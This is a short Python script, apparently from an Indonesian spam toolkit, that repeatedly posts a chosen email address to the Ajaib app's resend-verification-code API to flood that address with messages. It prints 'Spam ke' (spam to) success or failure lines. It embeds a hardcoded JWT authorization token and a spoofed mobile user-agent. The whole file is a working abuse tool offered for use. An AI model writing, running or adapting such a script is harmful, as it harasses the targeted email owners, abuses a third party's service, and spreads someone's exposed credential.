import requests,os,sys,json
from time import sleep
from war.war import *

def mai(mail, jml):
	sleep(1)
	print("")
	dat = json.dumps({"email":mail})
	head = {
	"authorization": "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0NzQzNDEsInVzZXJuYW1lIjoiYXNlY2Nlcm9yIiwiZXhwIjoxNjA1MDc5MDMwLCJlbWFpbCI6ImFzZWNjZXJvckBnbWFpbC5jb20iLCJvcmlnX2lhdCI6MTU5NzMwMzAzMH0.Po0t3anfYijeuUzWNvtxTM6sUYvXtJb87PGejw7R0jY",
	"accept-language": "id",
	"user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"content-type": "application/json",
	"accept": "*/*",
	}

	for x in range(jml):
		cal = requests.post("https://app.ajaib.co.id/api/v2/resend-verification-code/",data=dat,headers=head)
		if 'detail' in cal.text:
			print(f"{k}[+] {c}Spam ke {k}{mail} {c}Berhasil ")
			sleep(6)
		else:
			print(f"{r}[+] {c}Spam ke {k}{mail} {c}Gagal!! ")
			sleep(6)
